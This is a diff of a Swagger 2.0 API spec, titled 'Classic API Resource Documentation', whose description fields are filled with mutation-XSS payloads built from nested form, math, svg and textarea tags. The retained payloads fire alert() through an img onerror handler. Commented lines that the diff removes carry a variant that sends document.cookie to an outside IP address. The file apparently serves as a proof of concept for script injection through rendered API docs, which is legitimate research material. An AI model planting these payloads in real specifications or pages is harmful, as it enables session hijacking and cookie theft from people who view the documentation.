@@ -1,9 +1,8 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: |                                                                                                    # change this
+  description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-    # <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://101.188.67.134/?'+document.cookie;>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,10 +27,8 @@ paths:
   '/accounts/groupid/{id}':
     delete:
       parameters:
-        - description: |   
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-          # change this
-            # <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='http://101.188.67.134/?'+document.cookie;>"></form>
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
           format: int64
           in: path
